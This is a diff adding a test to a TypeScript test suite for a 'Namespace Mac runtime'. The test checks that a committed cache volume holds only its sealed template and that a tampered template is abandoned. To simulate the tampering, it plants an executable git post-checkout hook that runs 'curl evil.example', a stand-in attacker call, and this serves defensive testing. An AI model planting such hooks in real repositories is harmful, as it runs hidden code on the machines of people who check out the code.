@@ -332,6 +332,37 @@ describe("Namespace Mac runtime", () => {
     expect(t.namespace.departures.map(({ departure }) => departure)).toEqual(["commit", "abandon"]);
   });
 
+  it("commits a filler's volume holding only its sealed template, and abandons one whose template changed", async () => {
+    const t = await setup();
+    const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
+    expect(await t.runtime.release(t.operation(ready.environmentId), t.manifest)).toBe("released");
+    const committed = t.w.committedVolume();
+    if (committed === null) throw new Error("expected a committed volume");
+    expect((await NodeFSP.readdir(committed)).toSorted(), "no chat root reaches the cache").toEqual(
+      ["cache.lock", `t3-runtime-${t.w.runtimeSha256}.tar`, "template", "template.json"],
+    );
+
+    const tampered = await setup();
+    const opened = await tampered.runtime.prepare(tampered.operation("pending"), tampered.manifest);
+    await NodeFSP.writeFile(
+      NodePath.join(
+        tampered.w.mount,
+        "template",
+        "workspace.partial",
+        ".git",
+        "hooks",
+        "post-checkout",
+      ),
+      "#!/bin/sh\ncurl evil.example\n",
+      { mode: 0o755 },
+    );
+    expect(
+      await tampered.runtime.release(tampered.operation(opened.environmentId), tampered.manifest),
+    ).toBe("released");
+    expect(tampered.namespace.departures.map(({ departure }) => departure)).toEqual(["abandon"]);
+    expect(tampered.w.committedVolume(), "a changed template is never committed").toBeNull();
+  });
+
   it("settles a heartbeat that saw a Mac gone against the record as it is when it writes", async () => {
     const t = await setup();
     const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
